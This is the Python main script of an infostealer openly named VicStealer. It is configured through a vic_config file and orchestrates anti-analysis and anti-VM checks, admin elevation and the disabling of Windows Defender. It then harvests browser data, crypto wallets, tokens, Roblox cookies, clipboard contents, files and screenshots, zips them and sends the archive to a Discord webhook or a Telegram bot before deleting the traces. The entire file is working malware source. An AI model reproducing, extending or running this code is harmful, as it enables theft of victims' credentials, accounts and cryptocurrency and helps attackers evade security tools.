"""This is the main entry point for the VicStealer malware. It orchestrates the execution of various modules based on the configuration settings defined in vic_config.py. The script performs anti-analysis checks, disables security features, extracts sensitive data from browsers, wallets, and other applications, and sends the collected data to specified endpoints such as Discord or Telegram."""


import os
import shutil
import asyncio
import time
#-----------------------------------------------------------------
from modules.screan_shot.screan_shot import screan_shot
from modules.antianalysis.check_analysis import Anti_Analysis
from modules.antivirus.antivirus import deseble_defander
from modules.antiVM.antiVM import AntiVm
from modules.Browsers.Browser import Walkthrough#
from modules.client_files.client_files import steal_desktop_txt_file
from modules.software_files.games.games import gamesSteal
import modules.installed_software.instaled_Software as installed_software
from modules.system.systemInfo import getOS
from modules.Browsers.browers_version.browsers_version import all_browsers_version
from modules.tokens.tokens import StealAllTokens
from modules.network.network import network_data
from modules.clipper_data.clipper_steal_data import clipboard_data
from modules.wallet.wallet import Wallets
from modules.Process.process import steal_process
from modules.software_files.copy_and_steal_all_files import StealAll
from modules.send.sendData import send_data
from modules.runasadmin.run_as_admin import run_as_admin
from modules.CIS.anti_cis import anti_cis
from modules.software_files.roblox.roblox_ import extract_roblox_cookies
from modules.send.sendData import send_to_discord
from modules.errorMessage.errorMessage import show_message_box
#-----------------------------------------------------------------
from log_Style import telegram_log, descord_log
from vic_config import config


    

      
def main() -> None:
    
    if config.get("checkAnalysis") == 1:
            Anti_Analysis() # anti analysis
    if config.get("antiVM") == 1:
        AntiVm() # anti vm
    if config.get("antiCIS") == 1:
        anti_cis(config.get("BLACKLIST")) # anti cis
        
    if config.get("executionDelay") != "":
        time.sleep(float(config["executionDelay"]))
        
    if config.get("UACAdmin") == 1:
        run_as_admin() # run as admin
        
        
    if config.get("defenderDisable") == 1:
        deseble_defander()
        
    if config.get("errorMessage") != "":
        show_message_box(config["errorMessage"], "System Error")
        
    # create king folder
    result_log_dir: str = os.path.join("C:\\Windows\\Temp", config.get("logFileName")) # create folder path
    os.makedirs(result_log_dir, exist_ok=True)# create folder

    if not os.path.exists(result_log_dir): # check folder is exists
        return None
        
    async def _run_all_functions() -> None:
        if config.get("extractBrowsersData") == 1:
            Walkthrough(result_log_dir)
            
        if config.get("extractWallets") == 1:
            Wallets(result_log_dir)
            
        if config.get("extractFiles") == 1:
            steal_desktop_txt_file(result_log_dir)
            
        if config.get("extractGameData") == 1:
            gamesSteal(result_log_dir)
            extract_roblox_cookies(result_log_dir)
            
        installed_software.get_installed_programs(result_log_dir)
        if config.get("extractSystemInfo") == 1:
            getOS(result_log_dir)
            
        if config.get("extractBrowsersVersion") == 1:
            all_browsers_version(result_log_dir)
            
        if config.get("extractTokens") == 1:
            StealAllTokens(result_log_dir)
            
        if config.get("networkSteal") == 1:
            network_data(result_log_dir)
            
        if config.get("clipboardSteal") == 1:
            clipboard_data(result_log_dir)
            
        if config.get("extractProcess") == 1: 
            steal_process(result_log_dir)
            
        if config.get("screanShot") == 1:
            screan_shot(result_log_dir)
            
        if config.get("appCollectorEnabled") == 1:
            StealAll(result_log_dir, config)
                  
    asyncio.run(_run_all_functions())
    shutil.make_archive(result_log_dir, 'zip', result_log_dir) # zip folder
    
    zip_file_path: str = f'{result_log_dir}.zip'
    
    if not os.path.exists(zip_file_path): # check result.zip is exists are not return and exit function
        return None # breack funtion
    
    if config.get("sendToDiscord") == 1 and config.get("discordWebhookUrl") != "":
        send_to_discord(
            config["discordWebhookUrl"],
            zip_file_path,
            descord_log()
        ) # send data to discord
        
    if config.get("sendToTelegram") == 1 and config.get("telegramBotToken") != "" and config.get("telegramChatId") != "":
        send_data(
            config["telegramBotToken"],
            config["telegramChatId"],
            zip_file_path,
            telegram_log()
        ) # send data to telegram
        
        
    try:
        shutil.rmtree(result_log_dir) # delete folder after zip
        os.remove(zip_file_path) # delete zip file after send to telegram
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
    